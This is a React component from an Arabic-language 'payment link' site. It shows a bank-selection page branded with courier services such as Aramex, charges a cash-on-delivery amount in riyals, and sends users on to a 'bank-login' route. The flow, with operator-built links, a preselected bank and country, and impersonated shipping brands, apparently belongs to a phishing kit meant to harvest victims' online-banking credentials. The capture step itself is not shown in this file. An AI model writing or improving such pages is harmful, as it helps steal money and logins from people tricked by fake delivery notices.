import { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { useLink } from "@/hooks/useSupabase";
import { Building2, ArrowLeft, Loader2 } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getCountryByCode } from "@/lib/countries";
import { getBanksByCountry, Bank } from "@/lib/banks";

const PaymentBankSelector = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData, isLoading: linkLoading } = useLink(id);
  
  const [selectedBank, setSelectedBank] = useState<string>("");
  const [banks, setBanks] = useState<Bank[]>([]);
  const [loadingBanks, setLoadingBanks] = useState(false);
  
  // Get country from link data
  const countryCode = linkData?.country_code || "";
  const countryData = getCountryByCode(countryCode);
  
  // Get preselected bank from link payload if available
  const preselectedBank = linkData?.payload?.selected_bank;
  
  const customerInfo = JSON.parse(sessionStorage.getItem('customerInfo') || '{}');
  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  
  const shippingInfo = linkData?.payload as any;
  const amount = shippingInfo?.cod_amount || 500;
  const formattedAmount = `${amount} ر.س`;
  
  // Load banks when country is available from link data
  useEffect(() => {
    if (countryCode) {
      setLoadingBanks(true);
      // Simulate API call
      setTimeout(() => {
        const countryBanks = getBanksByCountry(countryCode);
        setBanks(countryBanks);
        setLoadingBanks(false);
        
        // Auto-select bank if it was preselected during link creation
        if (preselectedBank) {
          setSelectedBank(preselectedBank);
        }
      }, 300);
    }
  }, [countryCode, preselectedBank]);
  
  const handleBankSelect = (bankId: string) => {
    setSelectedBank(bankId);
  };
  
  const handleSkip = () => {
    // Store skip flag in sessionStorage
    sessionStorage.setItem('selectedCountry', countryCode);
    sessionStorage.setItem('selectedBank', 'skipped');
    
    toast({
      title: "تم التخطي",
      description: "يمكنك تسجيل الدخول إلى أي بنك",
    });
    
    navigate(`/pay/${id}/bank-login`);
  };
  
  const handleContinue = () => {
    if (selectedBank) {
      // Store selection in sessionStorage
      sessionStorage.setItem('selectedCountry', countryCode);
      sessionStorage.setItem('selectedBank', selectedBank);
      
      navigate(`/pay/${id}/bank-login`);
    }
  };
  
  // Show loading state while fetching link data
  if (linkLoading || !linkData) {
    return (
      <div 
        className="min-h-screen py-4 sm:py-12 flex items-center justify-center bg-background" 
        dir="rtl"
        style={{
          background: `linear-gradient(135deg, ${branding.colors.primary}08, ${branding.colors.secondary}08)`
        }}
      >
        <div className="text-center">
          <Loader2 className="w-12 h-12 animate-spin mx-auto mb-4" style={{ color: branding.colors.primary }} />
          <p className="text-muted-foreground">جاري تحميل البيانات...</p>
        </div>
      </div>
    );
  }
  
  // Show error if no country data
  if (!countryData) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
        <div className="text-center p-8">
          <Building2 className="w-16 h-16 mx-auto mb-4 text-muted-foreground" />
          <h2 className="text-2xl font-bold mb-2 text-foreground">خطأ في البيانات</h2>
          <p className="text-muted-foreground mb-6">لم يتم العثور على بيانات الدولة</p>
          <Button onClick={() => navigate('/services')}>العودة للخدمات</Button>
        </div>
      </div>
    );
  }
  
  return (
    <div 
      className="min-h-screen py-4 sm:py-12 bg-background" 
      dir="rtl"
      style={{
        background: `linear-gradient(135deg, ${branding.colors.primary}08, ${branding.colors.secondary}08)`
      }}
    >
      <div className="container mx-auto px-4 max-w-2xl">
        {/* Header */}
        <div className="mb-6">
          <button
            onClick={() => navigate(`/pay/${id}/details`)}
            className="flex items-center gap-2 text-sm text-muted-foreground hover:text-foreground mb-4"
          >
            <ArrowLeft className="w-4 h-4" />
            <span>رجوع</span>
          </button>
          
          <div className="flex items-center gap-3 mb-2">
            <div
              className="w-12 h-12 rounded-full flex items-center justify-center"
              style={{
                background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
              }}
            >
              <Building2 className="w-6 h-6 text-white" />
            </div>
            <div>
              <h1 className="text-2xl font-bold">اختر البنك</h1>
              <p className="text-sm text-muted-foreground">
                {serviceName} - {formattedAmount}
              </p>
            </div>
          </div>
        </div>

        {/* Country Badge */}
        {countryData && (
          <div className="mb-4">
            <Badge variant="secondary" className="text-sm">
              {countryData.flag} {countryData.nameAr}
            </Badge>
          </div>
        )}

        {/* Loading Banks */}
        {loadingBanks ? (
          <div className="text-center py-12">
            <Loader2 className="w-8 h-8 animate-spin mx-auto mb-4 text-primary" />
            <p className="text-muted-foreground">جاري تحميل البنوك...</p>
          </div>
        ) : banks.length === 0 ? (
          <Card className="p-8 text-center">
            <Building2 className="w-12 h-12 mx-auto mb-4 text-muted-foreground" />
            <p className="text-muted-foreground mb-4">لا توجد بنوك متاحة لهذه الدولة</p>
            <Button onClick={handleSkip} variant="outline">
              متابعة بدون تحديد بنك
            </Button>
          </Card>
        ) : (
          <>
            {/* Banks Grid */}
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 mb-6">
              {banks.map((bank) => (
                <Card
                  key={bank.id}
                  className={`p-4 cursor-pointer transition-all hover:shadow-md ${
                    selectedBank === bank.id
                      ? 'ring-2 bg-primary/5'
                      : 'hover:bg-accent/50'
                  }`}
                  style={{
                    borderColor: selectedBank === bank.id ? branding.colors.primary : undefined,
                  }}
                  onClick={() => handleBankSelect(bank.id)}
                >
                  <div className="flex items-center gap-3">
                    <div
                      className="w-10 h-10 rounded-lg flex items-center justify-center text-white text-sm font-bold"
                      style={{
                        background: selectedBank === bank.id
                          ? `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
                          : '#64748b',
                      }}
                    >
                      {bank.nameAr.charAt(0)}
                    </div>
                    <div className="flex-1">
                      <h3 className="font-semibold text-sm">{bank.nameAr}</h3>
                      <p className="text-xs text-muted-foreground">{bank.name}</p>
                    </div>
                    {selectedBank === bank.id && (
                      <div
                        className="w-5 h-5 rounded-full flex items-center justify-center"
                        style={{ backgroundColor: branding.colors.primary }}
                      >
                        <svg
                          className="w-3 h-3 text-white"
                          fill="none"
                          strokeLinecap="round"
                          strokeLinejoin="round"
                          strokeWidth="2"
                          viewBox="0 0 24 24"
                          stroke="currentColor"
                        >
                          <path d="M5 13l4 4L19 7" />
                        </svg>
                      </div>
                    )}
                  </div>
                </Card>
              ))}
            </div>

            {/* Action Buttons */}
            <div className="space-y-3">
              <Button
                onClick={handleContinue}
                disabled={!selectedBank}
                className="w-full h-12 text-base font-semibold"
                style={{
                  background: selectedBank
                    ? `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
                    : undefined,
                }}
              >
                متابعة
              </Button>
              
              <Button
                onClick={handleSkip}
                variant="outline"
                className="w-full h-12 text-base"
              >
                تخطي واستخدام أي بنك
              </Button>
            </div>

            {/* Info Note */}
            <div className="mt-6 p-4 bg-muted/50 rounded-lg">
              <p className="text-xs text-muted-foreground text-center">
                💡 يمكنك تخطي هذه الخطوة واستخدام بطاقة من أي بنك
              </p>
            </div>
          </>
        )}
      </div>
    </div>
  );
};

export default PaymentBankSelector;
